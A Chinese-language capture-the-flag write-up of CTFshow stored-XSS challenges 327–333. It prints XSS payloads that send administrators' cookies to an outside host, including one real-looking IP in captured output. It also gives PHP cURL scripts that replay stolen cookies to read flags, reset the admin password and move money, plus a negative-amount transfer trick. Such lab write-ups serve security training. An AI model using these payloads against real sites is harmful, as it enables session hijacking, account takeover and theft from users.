---
{"dg-publish":true,"title":"CTFshow_XSS_存储型","dg-path":"安全/靶场/CTFshow_XSS_存储型.md","permalink":"/安全/靶场/CTFshow_XSS_存储型/","dgPassFrontmatter":true}
---

# WEB 327

![Pasted image 20240817091928.png](/img/user/picture/Pasted%20image%2020240817091928.png)
这个就是一个信息系统，这里发件人可以随便填，因为我们要获取管理员的cookie，所以我们这里收件人要填写admin

payload：
```
<body/onload=document.location.href="http://<ip>//get.php?cookie="+document.cookie;>
```
![Pasted image 20240817092645.png](/img/user/picture/Pasted%20image%2020240817092645.png)

![Pasted image 20240817092656.png](/img/user/picture/Pasted%20image%2020240817092656.png)

# WEB 328


![Pasted image 20240817092824.png](/img/user/picture/Pasted%20image%2020240817092824.png)
这里是一个网站登陆注册页面

也有一个用户账号密码后台管理员页面
![Pasted image 20240817092948.png](/img/user/picture/Pasted%20image%2020240817092948.png)
所以我们可以尝试将payload储存到账号密码中，所以就需要注册

这里需要用script标签
```
<script>document.location.href="http://<ip>/get.php?cookie="+document.cookie</script>
```
![Pasted image 20240817093333.png](/img/user/picture/Pasted%20image%2020240817093333.png)


![Pasted image 20240817093503.png](/img/user/picture/Pasted%20image%2020240817093503.png)
这边收到了很多cookie，并没有flag，我们尝试用这个cookie登陆管理员账号试一下
![Pasted image 20240817093655.png](/img/user/picture/Pasted%20image%2020240817093655.png)




# WEB 329-1

这一关和上一关很像，但是有一个区别就是能得到cookie但是还是访问不了页面
原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie

然后wp的思路就是构造一个js代码，能把关键信息传到服务器上

我有一个想法，那就是能不能利用脚本来利用cookie来获取信息
这个方法确实可以，下面是简单记录

抓包查看发现每次获取信息都是这么一个数据包
![Pasted image 20240817152926.png](/img/user/picture/Pasted%20image%2020240817152926.png)
我们尝试构造一个php脚本，当他获取到cookie时，就去发送这个数据包，如果够快是可以获取到flag的

脚本代码如下：
```php
<?php

// 获取GET参数中的cookie值
$cookie = $_GET['cookie'];

// 初始化cURL会话
$ch = curl_init();

// 设置cURL选项
curl_setopt($ch, CURLOPT_URL, "http://69c414d5-a2d0-472d-92b1-ffbd14b75819.challenge.ctf.show/api/?page=1&limit=10");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // 返回数据而不是直接输出
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Host: 69c414d5-a2d0-472d-92b1-ffbd14b75819.challenge.ctf.show",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept: application/json, text/javascript, */*; q=0.01",
    "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding: gzip, deflate",
    "X-Requested-With: XMLHttpRequest",
    "Referer: http://69c414d5-a2d0-472d-92b1-ffbd14b75819.challenge.ctf.show/manager.php",
    "Cookie: {$cookie}",
    "DNT: 1",
    "Connection: close"
]);

// 接受压缩编码的数据
curl_setopt($ch, CURLOPT_ENCODING, ""); // 允许cURL自动解压缩响应内容

// 执行cURL请求并获取响应数据
$response = curl_exec($ch);

// 检查是否有错误
if ($response === false) {
    echo "cURL Error: " . curl_error($ch);
} else {
    // 保存响应数据到文件
    file_put_contents("response.txt", $response);
    echo "Response saved to response.txt";
}

// 关闭cURL会话
curl_close($ch);

?>

```

我们构造payload
```
<script>document.location.href="http://<ip>/a.php?cookie="+document.cookie</script>
```

获取到flag
![Pasted image 20240817153159.png](/img/user/picture/Pasted%20image%2020240817153159.png)
```txt
{"code":0,"msg":"\u67e5\u8be2\u6210\u529f","count":4,"data":[{"username":"flag","password":"ctfshow{9fb8af80-8a64-4f83-85a0-f45b06274536}"},{"username":"admin","password":"ctfshowdacaiji"},{"username":"<script>document.location.href=\"http:\/\/47.120.30.170\/get.php?cookie=\"+document.cookie<\/script>","password":"123456"},{"username":"<script>document.location.href=\"http:\/\/47.120.30.170\/a.php?cookie=\"+document.cookie<\/script>","password":"123456"}]}
```



# WEB 329-2












# WEB 330

这一关多了修改密码的功能
![Pasted image 20240817165046.png](/img/user/picture/Pasted%20image%2020240817165046.png)


我们抓一下包看看
```http
GET /api/change.php?p=222 HTTP/1.1
Host: fe178b3d-6299-44a8-89a9-6d24e1caefa1.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://fe178b3d-6299-44a8-89a9-6d24e1caefa1.challenge.ctf.show/change.php
Cookie: PHPSESSID=rerdh3bri3im0dlq86ennri52l
DNT: 1
Connection: close
```
发现他要修改的密码在url中，而判断身份是用的cookie，所以我们可以尝试用管理员的cookie来修改管理员的密码

让我们稍微修改一下脚本
```php
<?php

// 获取GET参数中的cookie值
$cookie = $_GET['cookie'];

// 初始化cURL会话
$ch = curl_init();

// 设置cURL选项
curl_setopt($ch, CURLOPT_URL, "http://fe178b3d-6299-44a8-89a9-6d24e1caefa1.challenge.ctf.show/api/change.php?p=111");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // 返回数据而不是直接输出
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Host: fe178b3d-6299-44a8-89a9-6d24e1caefa1.challenge.ctf.show",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept: */*",
    "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding: gzip, deflate",
    "X-Requested-With: XMLHttpRequest",
    "Referer: http://fe178b3d-6299-44a8-89a9-6d24e1caefa1.challenge.ctf.show/change.php",
    "Cookie: {$cookie}",
    "DNT: 1",
    "Connection: close"
]);

// 接受压缩编码的数据
curl_setopt($ch, CURLOPT_ENCODING, ""); // 允许cURL自动解压缩响应内容

// 执行cURL请求并获取响应数据
$response = curl_exec($ch);

// 检查是否有错误
if ($response === false) {
    echo "cURL Error: " . curl_error($ch);
} else {
    // 保存响应数据到文件
    file_put_contents("response.txt", $response);
    //echo "Response saved to response.txt";
}

// 关闭cURL会话
curl_close($ch);

?>

```
接收到信息，表明admin密码已经被修改为111
![Pasted image 20240817170158.png](/img/user/picture/Pasted%20image%2020240817170158.png)


尝试登陆

获得flag
![Pasted image 20240817170111.png](/img/user/picture/Pasted%20image%2020240817170111.png)

看了一下别人的WP，发现还有更简单的方法
我们现在的思路时获取admin的cookie然后我们去修改admin的密码，为什么不让admin去自己访问修改密码的链接自己去修改自己的密码呢
所以我们有如下payload
```
<script>window.location.href='http://127.0.0.1/api/change.php?p=111;</script>
```




# WEB 331

这题和上一题很相似，只不过这一题修改密码的包变为了POST

```http
POST /api/change.php HTTP/1.1
Host: 44dbf2b2-dafb-4bcb-b3ec-eb6c58683ea3.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://44dbf2b2-dafb-4bcb-b3ec-eb6c58683ea3.challenge.ctf.show/change.php
Content-Length: 5
Cookie: PHPSESSID=1mc099bhd1ao3l392sirabu5v8
DNT: 1
Connection: close

p=111
```

则构造payload：
```
<script>$.ajax({url:'api/change.php',type:'post',data:{p:'111'}});</script>
```


# WEB 332

这一题增加了金钱系统，flag要用钱来购买
![Pasted image 20240817212142.png](/img/user/picture/Pasted%20image%2020240817212142.png)
我们首先尝试转账金额设置为负数
![Pasted image 20240817212219.png](/img/user/picture/Pasted%20image%2020240817212219.png)
![Pasted image 20240817212239.png](/img/user/picture/Pasted%20image%2020240817212239.png)
现在就可以购买flag了




# WEB 333

这一题转负金额的bug被修复了

有一个思路就是每一个被新建的账号都有5元的初始金额，所以我们可以不断创建新号来将那5元钱转到一个号上
但感觉这个方法有点复杂，还是再看看吧


首先我们先看一下转账的数据包：
```http
POST /api/amount.php HTTP/1.1
Host: f8b8acd3-354c-42c7-b2cd-e5611e2856f6.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://f8b8acd3-354c-42c7-b2cd-e5611e2856f6.challenge.ctf.show/transfer.php
Cookie: PHPSESSID=9bf5bg4i7m4cme03f7k1c5hqrj
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

u=0&a=5
```
可以注意到判断用户身份的方法还是利用cookie
所以我们还有一个思路，那就是能不能盗取管理员的cookie，然后让管理员进行转账，我想管理员应该是有那么多钱的吧

注意到cookie也是会立马失效，所以还是需要利用脚本
![Pasted image 20240817213929.png](/img/user/picture/Pasted%20image%2020240817213929.png)
好吧，这个好像并不可行，但是还是把脚本贴一下把

```php
<?php
// 获取cookie参数
$cookie = $_GET['cookie'];

// 初始化cURL会话
$ch = curl_init();

// 设置cURL的目标URL
curl_setopt($ch, CURLOPT_URL, "http://f8b8acd3-354c-42c7-b2cd-e5611e2856f6.challenge.ctf.show/api/amount.php");

// 设置cURL的POST请求
curl_setopt($ch, CURLOPT_POST, 1);

// 设置POST字段数据
$post_fields = "u=kongyu204&a=999";
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);

// 设置请求头
$headers = [
    "Host: f8b8acd3-354c-42c7-b2cd-e5611e2856f6.challenge.ctf.show",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding: gzip, deflate",
    "Referer: http://f8b8acd3-354c-42c7-b2cd-e5611e2856f6.challenge.ctf.show/transfer.php",
    "Cookie: {$cookie}",
    "DNT: 1",
    "Connection: close",
    "Upgrade-Insecure-Requests: 1",
    "Content-Type: application/x-www-form-urlencoded",
    "Content-Length: " . strlen($post_fields)
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);


// 接受压缩编码的数据
curl_setopt($ch, CURLOPT_ENCODING, ""); // 允许cURL自动解压缩响应内容

// 返回响应结果而非直接输出
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// 执行cURL请求
$response = curl_exec($ch);

// 关闭cURL会话
curl_close($ch);

// 将接收到的响应结果保存到文件中
file_put_contents("response.txt", $response);

// 输出提示信息
echo "请求已发送，响应结果已保存到 response.html 文件中。";
?>

```

但是好像也可以
![Pasted image 20240817214150.png](/img/user/picture/Pasted%20image%2020240817214150.png)


![Pasted image 20240817214202.png](/img/user/picture/Pasted%20image%2020240817214202.png)
确实转过去了

![Pasted image 20240817214306.png](/img/user/picture/Pasted%20image%2020240817214306.png)
md，什么情况


再新建一个靶场试一下
换了一个靶场可以了
![Pasted image 20240817221447.png](/img/user/picture/Pasted%20image%2020240817221447.png)
神奇




















